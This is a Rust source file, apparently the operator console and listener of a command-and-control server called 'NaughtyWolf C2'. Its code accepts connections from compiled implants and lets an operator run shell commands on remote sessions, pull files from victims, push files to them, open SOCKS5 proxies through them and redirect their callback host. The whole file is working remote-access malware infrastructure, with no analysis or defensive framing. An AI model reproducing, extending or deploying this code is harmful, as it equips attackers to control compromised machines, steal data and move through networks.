use std::sync::Arc;
use std::time::Duration;

use nw_server::{
    Dispatcher, ServerState, dispatch::Outcome, filestore::FileStore, queue::TaskQueue,
    session::SessionRegistry, uploadstore::UploadStore,
};
use tokio::sync::mpsc;
use uuid::Uuid;

fn main() -> anyhow::Result<()> {
    tracing_subscriber::fmt().with_env_filter(tracing_subscriber::EnvFilter::from_env("NW_LOG")).init();

    let bind = std::env::var("NW_BIND").unwrap_or_else(|_| "127.0.0.1:8081".into());
    let psk = std::env::var("NW_PSK").unwrap_or_else(|_| "dev-psk-change-me".into());

    let registry = Arc::new(SessionRegistry::new());
    let queue = Arc::new(TaskQueue::new());
    let uploads = UploadStore::default();
    let state = ServerState {
        registry: registry.clone(),
        queue: queue.clone(),
        psk: Arc::new(psk.into_bytes()),
        files: FileStore::default(),
        uploads: uploads.clone(),
    };

    let rt = tokio::runtime::Runtime::new()?;

    // C2 listener runs in the background so a compiled implant can connect.
    let listener_state = state.clone();
    rt.spawn(async move { nw_server::serve(listener_state, &bind).await });

    let dispatcher = Dispatcher::new(registry, queue, uploads);
    rt.block_on(repl(dispatcher))?;
    Ok(())
}

async fn repl(dispatcher: Dispatcher) -> anyhow::Result<()> {
    println!("NaughtyWolf C2 console. Type 'help' for commands.");
    let (tx, mut rx) = mpsc::channel::<String>(64);
    std::thread::spawn(move || {
        let stdin = std::io::stdin();
        loop {
            let mut line = String::new();
            match stdin.read_line(&mut line) {
                Ok(0) | Err(_) => break,
                Ok(_) => {
                    if tx.blocking_send(line).is_err() {
                        break;
                    }
                }
            }
        }
    });

    while let Some(line) = rx.recv().await {
        let line = line.trim();
        if line == "exit" || line == "quit" {
            break;
        }
        if line.is_empty() {
            continue;
        }
        if line == "help" {
            print_help();
            continue;
        }
        match dispatcher.parse(line) {
            Outcome::Local { message } => {
                if !message.is_empty() {
                    println!("{}", message);
                }
            }
            Outcome::TaskQueued { session, task_id } => {
                println!("queued {} to {}", task_id, session);
                wait_result(&dispatcher, &session, &task_id).await;
            }
            Outcome::Error(e) => eprintln!("error: {}", e),
        }
    }
    Ok(())
}

/// Poll the queue until the task result arrives (or a time budget elapses).
async fn wait_result(dispatcher: &Dispatcher, session: &Uuid, task_id: &Uuid) {
    let mut waited = Duration::ZERO;
    let budget = Duration::from_secs(30);
    while waited < budget {
        if let Some(r) = dispatcher.queue.take_result(session, task_id) {
            let out = String::from_utf8_lossy(&r.stdout).to_string();
            let err = String::from_utf8_lossy(&r.stderr).to_string();
            println!("[exit {}] {}", r.exit_code, out);
            if !err.is_empty() {
                eprintln!("[stderr] {}", err);
            }
            return;
        }
        tokio::time::sleep(Duration::from_millis(250)).await;
        waited += Duration::from_millis(250);
    }
    eprintln!("timed out waiting for task {}", task_id);
}

fn print_help() {
    println!(
        "commands:\n\
         \x20 sessions                  list registered sessions\n\
         \x20 interact <session-id>     focus a session\n\
         \x20 shell <cmd> [args...]     run a command on the focused session\n\
         \x20 download <path>           stream a remote file to the downloads dir\n\
         \x20 upload <local> <dest>     push a local file to the focused session\n\
         \x20 socks <port>              start a SOCKS5 proxy on the focused session\n\
         \x20 jobs                     list task statuses for the focused session\n\
         \x20 redirect <host>            change the focused session callback host\n\
         \x20 kill <session-id>         drop a session\n\
         \x20 exit                      quit"
    );
}
